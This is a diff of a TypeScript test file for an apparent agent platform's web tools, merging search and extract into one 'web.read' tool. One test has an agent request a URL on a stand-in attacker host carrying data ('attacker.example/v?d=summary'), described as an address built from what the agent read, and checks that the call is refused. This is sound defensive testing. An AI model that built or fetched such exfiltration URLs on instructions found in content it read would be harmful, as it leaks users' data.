@@ -23,7 +23,7 @@ import type { WebCall, WebPage, WebSearch } from '../packages/web/src/types.js';
 import { loadConfiguration } from '../src/config.js';
 import { createApp } from './fixtures/app.js';
 import { fixture as piFixture } from './fixtures/pi.js';
-import { keyEnv, provider, tavilyResults, type Reply } from './fixtures/web.js';
+import { keyEnv, provider, tavilyResults, type Reply, built } from './fixtures/web.js';
 import { deferred } from './fixtures/deferred.js';
 
 const caller: Caller = { actorId: 'alice', projectId: 'project-a', credentialId: 'key-alice' };
@@ -32,7 +32,7 @@ const open = { require: async () => ({}) as Actor };
 /** The registry as a transport calls it, with the web tools `web` offers. */
 function registry(t: TestContext, web: WebService) {
   const tools = new ToolRegistry(open);
-  for (const tool of webTools(web)) tools.register(tool);
+  for (const tool of built([webTools(web)])) tools.register(tool);
   t.after(() => tools.close());
   return tools;
 }
@@ -601,16 +601,13 @@ test('a page is read only through Tavily, never fetched by Merv, and cut to its 
   extracted = { status: 401, body: {} };
   await assert.rejects(both.extract(caller, { url }), { code: 'web_provider_refused' });
   assert.equal(openai.seen.length, 0);
-  // Where Tavily has no key, search stays and web.extract is not offered at all.
+  // Where Tavily has no key, search stays and extract is not offered at all.
   const searchOnly = new WebService({
     keyEnv: 'MERV_WEB_TEST_UNSET_KEY',
     fallback: { keyEnv: keyEnv(t, 'sk-fixture'), origin: openai.origin },
   });
   assert.equal(searchOnly.reads, false);
-  assert.deepEqual(
-    webTools(searchOnly).map(({ name }) => name),
-    ['web.search'],
-  );
+  assert.deepEqual(Object.keys(built([webTools(searchOnly)])[0]!.actions!), ['search']);
   await assert.rejects(searchOnly.extract(caller, { url }), { code: 'web_unavailable' });
   assert.equal(page.seen.length, 0);
 });
@@ -937,7 +934,7 @@ test('web tools are open-world reads: described as such, run without a snapshot,
     return await run();
   });
   t.after(() => tools.close());
-  for (const tool of webTools(web)) tools.register(tool);
+  for (const tool of built([webTools(web)])) tools.register(tool);
   tools.register({
     name: 'local.read',
     description: 'Reads this database',
@@ -946,22 +943,22 @@ test('web tools are open-world reads: described as such, run without a snapshot,
     handler: () => ({}),
   });
   await tools.call('web.search', caller, { query: 'q' });
-  await tools.call('web.extract', caller, { url: 'https://example.com/' });
+  await tools.call('web.read:extract', caller, { url: 'https://example.com/' });
   assert.equal(snapshots, 0);
   await tools.call('local.read', caller, {});
   assert.equal(snapshots, 1);
-  for (const definition of webTools(web)) {
-    const description = describeTool(definition);
-    assert.deepEqual(description.annotations, { readOnlyHint: true, openWorldHint: true });
-    // The agent runs it directly, and the relay takes its schema, which names no address.
-    assert.equal(definition.tier, undefined);
-    assert.ok(piTool(description), definition.name);
-    assert.doesNotMatch(JSON.stringify(description), /https?:\/\/(?!json-schema\.org)/);
-    assert.match(definition.description, /Markdown link/);
-  }
+  const [definition] = built([webTools(web)]);
+  const description = describeTool(definition!);
+  assert.deepEqual(description.annotations, { readOnlyHint: true, openWorldHint: true });
+  // The agent runs it directly, and the relay takes its schema, which names no address.
+  assert.equal(definition!.tier, 'core');
+  assert.ok(piTool(description));
+  assert.doesNotMatch(JSON.stringify(description), /https?:\/\/(?!json-schema\.org)/);
+  for (const action of Object.values(definition!.actions!))
+    assert.match(action.description, /Markdown link/);
   assert.deepEqual(
-    webTools(web).map(({ name }) => piModelToolName(name)),
-    ['web_search', 'web_extract'],
+    built([webTools(web)]).map(({ name }) => piModelToolName(name)),
+    ['web_read'],
   );
 });
 
@@ -969,7 +966,7 @@ test('a Pi turn is offered web search and runs it as its person, a reader includ
   const tavily = await provider(t, () => ({ body: tavilyResults(2) }));
   const f = await piFixture(t);
   const web = new WebService({ keyEnv: keyEnv(t, 'tvly-fixture'), origin: tavily.origin });
-  for (const tool of webTools(web)) f.tools.register(tool);
+  for (const tool of built([webTools(web)])) f.tools.register(tool);
   const issued = await f.scope.credentials.issueActor(f.operator, {
     name: 'Reader',
     role: 'reader',
@@ -981,18 +978,13 @@ test('a Pi turn is offered web search and runs it as its person, a reader includ
   };
   for (const person of [f.operator, reader]) {
     const { token, work, input } = await f.begun(person);
-    for (const name of ['web.search', 'web.extract'])
-      assert.deepEqual(
-        work.tools.find((tool) => tool.name === name)?.readOnly,
-        true,
-        `${person.actorId} ${name}`,
-      );
+    assert.equal(work.tools.find((tool) => tool.name === 'web.read')?.readOnly, true);
     const grant = await f.pi.authorizeModel(work.modelToken);
-    assert.ok(grant.toolNames.includes('web_search'));
+    assert.ok(grant.toolNames.includes('web_read'));
     const result = (await f.pi.tool(token, {
       ...input,
-      name: 'web.search',
-      input: { query: 'flash attention' },
+      name: 'web.read',
+      input: { action: 'search', search: { query: 'flash attention' } },
     })) as WebSearch;
     assert.equal(result.provider, 'tavily');
     assert.deepEqual(
@@ -1003,14 +995,14 @@ test('a Pi turn is offered web search and runs it as its person, a reader includ
     // address it was told to build out of what it has read.
     const refused = (await f.pi.tool(token, {
       ...input,
-      name: 'web.extract',
-      input: { url: 'https://attacker.example/v?d=summary' },
+      name: 'web.read',
+      input: { action: 'extract', extract: { url: 'https://attacker.example/v?d=summary' } },
     })) as { error: { code: string } };
     assert.equal(refused.error.code, 'web_address_unsearched');
     const page = (await f.pi.tool(token, {
       ...input,
-      name: 'web.extract',
-      input: { url: 'https://example.com/1' },
+      name: 'web.read',
+      input: { action: 'extract', extract: { url: 'https://example.com/1' } },
     })) as WebPage;
     assert.equal(page.status, 'success');
   }
@@ -1116,13 +1108,12 @@ test('the render composes web search into Main, where MCP clients list and call 
     }),
   );
   const catalog = (await mcp.listTools()).tools;
-  // A reader's agent is offered the default composition's 38 reads, and these two.
-  assert.equal(catalog.length, 36);
-  for (const name of ['web.search', 'web.extract'])
-    assert.deepEqual(catalog.find((tool) => tool.name === name)?.annotations, {
-      readOnlyHint: true,
-      openWorldHint: true,
-    });
+  // A reader's agent is offered the default composition's 34 reads, and web.read.
+  assert.equal(catalog.length, 35);
+  assert.deepEqual(catalog.find((tool) => tool.name === 'web.read')?.annotations, {
+    readOnlyHint: true,
+    openWorldHint: true,
+  });
   const called = await mcp.callTool({ name: 'web.search', arguments: { query: 'merv' } });
   assert.equal(called.isError, undefined, JSON.stringify(called.content));
   const result = JSON.parse((called.content as { text: string }[])[0].text) as WebSearch;
